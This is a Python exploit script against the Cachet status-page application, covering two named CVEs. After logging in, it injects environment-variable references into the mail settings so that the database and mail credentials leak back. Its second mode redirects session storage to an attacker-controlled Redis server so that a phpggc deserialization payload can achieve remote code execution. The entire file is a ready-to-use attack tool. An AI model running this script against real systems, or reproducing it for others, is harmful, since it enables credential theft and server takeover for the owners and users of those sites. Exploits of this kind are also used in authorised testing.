#!/usr/bin/env python3
import requests, argparse
from bs4 import BeautifulSoup

# Welcome to my trash code

headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'}

def usage():
  file = __file__.rsplit('/', 1)[1]
  usage = f"{file} [-h] [-u USERNAME] [-p PASSWORD] [-url URL] [-host REDIS_HOST] [-port REDIS_PORT]"
  usage += f"\nExamples:\n\t# CVE-2021-39174\n\t{file} -u user -p pass -url http://cachet.site\n"
  usage += f"\n\t# CVE-2021-39172 - Only Redis Configuration\n\t{file} -u user -p pass -url http://cachet.site -host redis.server -port 6969"
  return usage

def arguments():
    parse = argparse.ArgumentParser(usage=usage())

    # Credentials
    parse.add_argument('-u', dest='username', type=str, help='Username')
    parse.add_argument('-p', dest='password', type=str, help='Password')

    # URL
    parse.add_argument('-url', dest='url', type=str, help='URL Cachet Site')
    
    # Redis config
    parse.add_argument('-host', dest='redis_host', type=str, help='Redis Server')
    parse.add_argument('-port', dest='redis_port', type=str, help='Redis Server Port')

    return parse.parse_args()

def get_token(text):
  return BeautifulSoup(text, 'lxml').find('input',attrs = {'name':'_token'})['value']

def get_value(USERNAME, PASSWORD, URL):
  client = requests.session()

  # Login
  crft = get_token(client.get(URL+'/auth/login', headers=headers).text)
  login_data = dict(username=USERNAME, password=PASSWORD, remember_me=0, _token=crft)
  client.post(URL+'/auth/login', data=login_data, headers=headers)

  # Get Settings
  settings = client.get(URL+'/dashboard/settings/mail',headers=headers).text
  var = BeautifulSoup(settings, 'lxml').findAll('input', attrs = {'type':'text'})[1]['value']
  print(f"[+] Values: \n\t {var}") 

def send_vars(USERNAME, PASSWORD, URL):
  with requests.Session() as client:
    # Login
    csrfone = get_token(client.get(URL+'/auth/login', headers=headers ).text)   
    login_data = dict(username=USERNAME, password=PASSWORD, remember_me=0, _token=csrfone)
    client.post(URL+'/auth/login', data=login_data, headers=headers)

    # Settings
    crftwo = get_token(client.get(URL+'/dashboard/settings/mail', headers=headers).text)
    sdata = {      
      'config[mail_address]': '"DB_USER: ${DB_USERNAME} DB_PASS: ${DB_PASSWORD} MAIL_USER: ${MAIL_USERNAME} MAIL_PASS: ${MAIL_PASSWORD}"',
      '_token': crftwo
    }
    print("[+] Sending referenced VARS.")
    client.post(URL+'/dashboard/settings/mail', data=sdata,headers=headers)
    client.get(URL+'/auth/logout',headers=headers)

def send_redis(USERNAME, PASSWORD, URL, REDIS_HOST, REDIS_PORT):
  with requests.Session() as client:
    # Login
    csrfone = get_token(client.get(URL+'/auth/login', headers=headers ).text)   
    login_data = dict(username=USERNAME, password=PASSWORD, remember_me=0, _token=csrfone)
    client.post(URL+'/auth/login', data=login_data, headers=headers)

    # Settings
    crftwo = get_token(client.get(URL+'/dashboard/settings/mail', headers=headers).text)
    sdata = {
      'config[cache_driver]': 'file',      
      'config[redis_host]': REDIS_HOST,
      'config[redis_database]': '0',
      'config[redis_port]': REDIS_PORT,  
      'config[session_driver]': 'redis',
      '_token': crftwo
    }    
    print("[+] Sending REDIS Config")
    client.post(URL+'/dashboard/settings/mail', data=sdata,headers=headers)
    client.get(URL+'/auth/logout',headers=headers)
    print(f"[+] Now you can run your Redis Server\n\t `redis-server --port {REDIS_PORT}`")
    print("[+] Modify the session value with the payload generated with `phpggc`")

if __name__ == '__main__':
  args = arguments()

  try:
    r = requests.get(args.url, timeout=5)
  except requests.exceptions.Timeout:
    print(f"[-] Timeout with URL: {args.url}")
    exit(1)
  except:
    print(f"[-] Unreachable URL: {args.url}")
    exit(1)
  
  if (args.username and args.password and args.url):
    if (args.redis_host and args.redis_port):
      # CVE-2021-39172
      print("[+] Redis Configuration for RCE")
      send_redis(args.username, args.password, args.url, args.redis_host, args.redis_port)
    else:
      # CVE-2021-39174
      print("[+] Configuration Leak")
      send_vars(args.username, args.password, args.url)
      get_value(args.username, args.password, args.url)
  else:
    print(f"[+] Run: { __file__.rsplit('/', 1)[1] } --help")
    exit(1) 